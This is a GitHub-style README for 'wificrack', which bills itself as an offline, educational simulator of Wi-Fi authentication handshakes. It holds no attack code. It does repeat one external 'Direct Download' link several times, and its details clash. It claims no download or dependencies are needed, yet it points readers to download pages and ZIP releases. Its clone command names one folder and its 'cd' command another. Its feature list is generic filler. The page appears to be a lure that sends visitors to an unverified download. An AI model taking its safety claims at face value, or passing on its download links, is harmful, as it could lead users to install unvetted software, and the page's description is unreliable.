# wificrack - Network Simulation Tool 2026

> A compact desktop simulation tool for demonstrating wireless network security ideas through guided, educational scenarios. It provides a safe setting for learning how authentication handshakes and protocol behavior work.

[![Platform](https://img.shields.io/badge/Platform-Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/fosterevan1999/wificrack-network-sim-2026?style=flat-square)](https://github.com/fosterevan1999/wificrack-network-sim-2026)

---

<p align="center">
  <a href="https://fosterevan1999.github.io/wificrack-network-sim-2026/">
    <img src="https://img.shields.io/badge/Download-wificrack%20Latest-brightgreen?style=for-the-badge" alt="Download wificrack">
  </a>
</p>

> **[Direct Download - wificrack v1.0](https://fosterevan1999.github.io/wificrack-network-sim-2026/)**

---

[Download Latest Build](https://fosterevan1999.github.io/wificrack-network-sim-2026/)

---

## About wificrack

wificrack creates a contained environment for studying wireless authentication workflows. It is aimed at security learners, instructors, and technical users who want to see how handshake-based protocols behave without touching live networks or devices. Because everything runs inside a sandboxed desktop setup, it works well for demonstrations, practice, and repeatable training sessions.

The app centers on showing authentication exchanges in a way that is easy to follow. It breaks down the process into clear stages, highlights what happens at each point, and removes the need for specialized hardware. The result is a practical learning aid for exploring the basics of network security in a controlled and predictable way.

## Features

- Models wireless authentication handshake flows
- Shows visual cues for each protocol step
- Operates fully offline with no network impact
- Requires no external hardware
- Lightweight HTML-based interface for fast setup
- Educational mode with guided, step-by-step notes
- Adjustable simulation settings for multiple scenarios
- Works across platforms using standard web technologies

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/fosterevan1999/wificrack-network-sim-2026.git
cd wificrack
```

No additional dependencies are required. Open the main HTML file directly in any modern web browser to launch the simulation.

## Usage

1. Open the HTML file in your browser to start the application.
2. Choose a simulation scenario from the available list.
3. Watch the handshake unfold as each stage is displayed.
4. Check the detailed log output for learning and review.

For command-line usage, the simulation can also be invoked via:

```bash
# Example: run with default parameters
python -m http.server 8000
# Then navigate to http://localhost:8000 in your browser
```

## Configuration

Simulation settings are kept in a local configuration file in the same folder as the application. Edit `config.json` to control:

- Handshake timeout duration
- Protocol version selection
- Log verbosity level
- Visual theme preferences

The configuration file is created automatically on first run with sensible defaults.

## Requirements

- Modern web browser (Chrome, Firefox, Edge, or Safari)
- No internet connection required for operation
- 50 MB free disk space for logs and configuration
- Operating system: Windows, macOS, or Linux

## FAQ

**Q: Is this tool safe to use on my network?**  
A: Yes. The simulation stays on your local system and does not connect to wireless hardware or real networks. It is intended for educational use only.

**Q: How do I update to the latest version?**  
A: Visit the GitHub releases page for new builds. Download the latest ZIP archive and replace the files in your current installation.

**Q: Can I customize the simulation scenarios?**  
A: Yes. You can change several parameters through the configuration file. Advanced users can also extend the HTML source code.

**Q: Where can I report issues or request features?**  
A: Open an issue in the GitHub repository and include a clear description of the problem or the feature you want.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
